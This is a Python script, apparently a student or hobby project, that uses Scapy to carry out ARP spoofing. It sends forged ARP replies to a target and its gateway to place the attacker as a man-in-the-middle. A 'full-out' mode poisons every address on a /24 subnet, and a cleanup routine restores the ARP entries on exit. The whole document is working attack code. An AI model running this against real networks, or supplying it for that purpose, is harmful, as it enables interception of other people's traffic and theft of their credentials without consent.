import sys
from scapy.all import *

attackerIp = get_if_addr('enp0s10') #ip adress attacker, automatical, interface as GUI variable
TargetIP = '10.0.123.4' #GUI variable, target ip
RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
guessIP = '10.0.123.'
targetIp = TargetIP
hostIp = RouterIP #host = router
inf = 'enp0s10' #interface variable 
silent = True #variable for switching between silent and full-out mode
    
def spoof(targetIp, hostIp, attackerIp):
    targetMac = getmacbyip(targetIp)
    attackerMac = get_if_hwaddr(inf) #get attacker MAC
    hostMac = getmacbyip(hostIp)
    
    #send packet "host" to server    
    arp = Ether() / ARP()
    arp[Ether].src = attackerMac
    arp[ARP].hwsrc = attackerMac
    arp[ARP].psrc = hostIp
    arp[ARP].hwdst = targetMac
    arp[ARP].pdst = targetIp
        
    sendp(arp, iface=inf)
    
    #send packet "server" to host
    arp2 = Ether() / ARP()
    arp2[Ether].src = attackerMac
    arp2[ARP].hwsrc = attackerMac
    arp2[ARP].psrc = targetIp
    arp2[ARP].hwdst = hostMac
    arp2[ARP].pdst = hostIp

    sendp(arp2, iface=inf)
        
def full_spoof(targetIP, hostIP, attackerIP):
    #loop trough every ip that could be on your network and be the MITM on all of them
    for x in range(0, 255):
        y = str(x)
        targetIP = targetIP + y
        spoof(targetIP, hostIP, attackerIP)
        targetIP = guessIP
        
def end_spoof(targetIp, hostIp, attackerIp):
    targetMac = getmacbyip(targetIp)
    attackerMac = getmacbyip(attackerIp)
    hostMac = getmacbyip(hostIp)
        
    #undo ARP spoofing
    correctARP = Ether() / ARP()
    correctARP[Ether].src = attackerMac
    correctARP[ARP].hwsrc = hostMac
    correctARP[ARP].psrc = hostIp
    correctARP[ARP].hwdst = targetMac
    correctARP[ARP].pdst = targetIp
    sendp(correctARP, iface=inf)
    
try:
    while True:
        if silent == True:
            spoof(targetIp, hostIp, attackerIp)
        elif silent == False:
            full_spoof(guessIP, hostIp, attackerIp)
        time.sleep(2)
            
except KeyboardInterrupt:
    print('stopping attack')
    end_spoof(targetIp, hostIp, attackerIp)
    end_spoof(hostIp, targetIp, attackerIp)
